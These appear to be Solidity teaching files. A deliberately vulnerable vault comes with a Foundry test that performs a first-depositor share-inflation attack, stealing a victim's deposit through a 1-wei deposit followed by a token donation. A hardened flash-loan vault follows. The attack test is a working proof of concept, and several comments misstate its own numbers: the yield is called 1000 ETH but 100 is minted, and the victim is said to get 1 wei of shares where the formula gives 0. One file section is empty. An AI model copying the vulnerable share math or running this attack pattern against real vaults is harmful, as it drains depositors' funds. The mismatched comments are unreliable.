**MaliciousVault.sol**

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @notice A vulnerable vault where early depositors can exploit share calculation

contract MaliciousVault {
    IERC20 public immutable token;
    uint256 public totalShares;
    uint256 public totalAssets;
    mapping(address => uint256) public shares;

    constructor(address _token) {
        token = IERC20(_token);
    }

    // Vulnerable deposit function - mints shares 1:1 for first deposit
    function deposit(uint256 amount) external {
        require(amount > 0, "Amount must be positive");
        token.transferFrom(msg.sender, address(this), amount);

        uint256 _totalAssets = token.balanceOf(address(this));
        uint256 newShares = (totalShares == 0)
            ? amount
            : (amount * totalShares) / (_totalAssets - amount); // exclude current deposit

        shares[msg.sender] += newShares;
        totalShares += newShares;
    }

    // Withdraw proportional to share ownership
    function withdraw(uint256 shareAmount) external {
        require(shareAmount <= shares[msg.sender], "Insufficient shares");
        uint256 _totalAssets = token.balanceOf(address(this));
        uint256 tokenAmount = (shareAmount * _totalAssets) / totalShares;

        shares[msg.sender] -= shareAmount;
        totalShares -= shareAmount;

        token.transfer(msg.sender, tokenAmount);
    }
}

contract MockERC20 is IERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "MockToken";
    string public symbol = "MOCK";
    uint8 public decimals = 18;
    uint256 public override totalSupply;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

contract FirstDepositorAttackTest is Test {
    MaliciousVault public vault;
    MockERC20 public token;
    
    address public attacker = address(0xBAD);
    address public victim = address(0xDEF);

    function setUp() public {
        token = new MockERC20();
        vault = new MaliciousVault(address(token));
        
        // Initial token distribution
        token.mint(attacker, 1);          // Attacker gets 1 wei
        token.mint(victim, 1000 ether);   // Victim gets 1000 ETH
    }

    function test_firstDepositorExploit() public {
        // Step 1: Attacker makes minimal first deposit (1 wei)
        vm.startPrank(attacker);
        token.approve(address(vault), 1);
        vault.deposit(1);  // Mints 1 share for 1 wei
        vm.stopPrank();
        
        // Step 2: Attacker manipulates vault by donating 1000 ETH directly
        // This increases totalAssets WITHOUT minting new shares
        token.mint(attacker, 1000 ether);
        vm.prank(attacker);
        token.transfer(address(vault), 1000 ether);
        
        // State after manipulation:
        // totalShares = 1 wei (attacker's share)
        // totalAssets = 1000 ETH + 1 wei ≈ 1000 ETH
        
        // Step 3: Victim deposits 1000 ETH
        vm.startPrank(victim);
        token.approve(address(vault), 1000 ether);
        vault.deposit(1000 ether);  // Only gets (1000e18 * 1) / 1000e18 = 1 wei share!
        vm.stopPrank();
        
        // Step 4: Vault generates yield (1000 ETH from fees)
        token.mint(address(vault), 100 ether);
        
        // Step 5: Attacker withdraws their 1 wei share
        vm.prank(attacker);
        vault.withdraw(1);  // Gets (1 * 2000e18) / 1 ≈ 2000 ETH!
        
        // Assertions
        uint256 attackerProfit = token.balanceOf(attacker);
        console.log("Attacker's profit:", attackerProfit / 1e18, "ETH");
        
        // Original 1 wei + donated 1000 ETH + nearly all 1000 ETH yield
        assertGt(attackerProfit, 1999 ether); 
        
        // Victim's remaining balance should be minimal
        assertLt(token.balanceOf(victim), 1 ether);
    }
}
```


**MinimalVault.sol**

**FlashLoanVault.sol**
```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./IFlashLoanReceiver.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import { ReentrancyGuard } from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract FlashLoanVault is ReentrancyGuard {
    using SafeERC20 for IERC20;

    IERC20 public immutable token;
    uint256 public totalShares;
    uint256 public totalAssets;
    mapping(address => uint256) public shares;

    uint256 public constant MINIMUM_SHARES = 1e6;

    bytes32 public constant FLASHLOAN_CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    // Flash loan tracking
    uint256 public totalFlashLoansOutstanding;

    // Dynamic fee model (in basis points: 1 bp = 0.01%)
    uint256 public immutable baseFee = 5;       // 0.05%
    uint256 public immutable feeSlope = 45;     // Up to +0.45%

    event Deposited(address indexed user, uint256 amount, uint256 sharesMinted);
    event Withdrawn(address indexed user, uint256 amount, uint256 sharesBurned);
    event FlashLoanExecuted(address indexed receiver, uint256 amount, uint256 fee);

    constructor(address _token) {
        token = IERC20(_token);
    }

    function deposit(uint256 amount) external nonReentrant {
        require(amount > 0, "Amount must be > 0");
        token.safeTransferFrom(msg.sender, address(this), amount);

        uint256 newShares;
        if (totalShares == 0) {
            require(amount > MINIMUM_SHARES * 100, "Minimum meaningful deposit required");
            newShares = amount - MINIMUM_SHARES;
            shares[address(0)] = MINIMUM_SHARES;
            totalShares = MINIMUM_SHARES + newShares;
        } else {
            require(totalAssets > 0, "Vault state invalid: totalAssets == 0");
            newShares = (amount * totalShares) / totalAssets;
            totalShares += newShares;
        }

        shares[msg.sender] += newShares;
        totalAssets += amount;

        emit Deposited(msg.sender, amount, newShares);
    }

    function withdraw(uint256 shareAmount) external nonReentrant {
        require(shareAmount > 0 && shares[msg.sender] >= shareAmount, "Invalid amount");

        uint256 tokenAmount = (shareAmount * totalAssets) / totalShares;
        require(tokenAmount > 0, "Withdraw amount too small");

        shares[msg.sender] -= shareAmount;
        totalShares -= shareAmount;
        totalAssets -= tokenAmount;

        token.safeTransfer(msg.sender, tokenAmount);

        emit Withdrawn(msg.sender, tokenAmount, shareAmount);
    }

    // ERC-3156: max flash loan
    function maxFlashLoan(address _token) external view returns (uint256) {
        return _token == address(token) ? totalAssets : 0;
    }

    // ERC-3156: dynamic flash loan fee
    function flashFee(address _token, uint256 amount) public view returns (uint256) {
        require(_token == address(token), "Unsupported token");
        return _calculateFee(amount);
    }

    // Flash loan logic
    function flashLoan(
        IFlashLoanReceiver receiver,
        address _token,
        uint256 amount,
        bytes calldata data
    ) external nonReentrant {
        require(_token == address(token), "Unsupported token");
        require(amount > 0 && amount <= totalAssets, "Invalid amount");

        uint256 fee = _calculateFee(amount);
        totalFlashLoansOutstanding += amount;

        uint256 balanceBefore = token.balanceOf(address(this));
        token.safeTransfer(address(receiver), amount);

        require(
            _verifyFlashLoanCallback(receiver, msg.sender, amount, fee, data),
            "Flash loan callback failed"
        );

        uint256 balanceAfter = token.balanceOf(address(this));
        require(balanceAfter >= balanceBefore + fee, "Flash loan not repaid with fee");

        totalAssets += fee;
        totalFlashLoansOutstanding -= amount;

        emit FlashLoanExecuted(address(receiver), amount, fee);
    }

    // Internal: calculate dynamic flash loan fee
    function _calculateFee(uint256 amount) internal view returns (uint256) {
        if (totalAssets == 0) return 0;
        uint256 utilization = (totalFlashLoansOutstanding * 1e18) / totalAssets;
        uint256 dynamicRate = baseFee + ((feeSlope * utilization) / 1e18); // basis points
        return (amount * dynamicRate) / 10_000;
    }

    // View: share price (for UI/info)
    function getPricePerShare() external view returns (uint256) {
        return (totalShares == 0) ? 1e18 : (totalAssets * 1e18) / totalShares;
    }

    function _verifyFlashLoanCallback(
        IFlashLoanReceiver receiver,
        address initiator,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) internal returns (bool) {
        return receiver.onFlashLoan(initiator, address(token), amount, fee, data) == FLASHLOAN_CALLBACK_SUCCESS;
    }
}
```
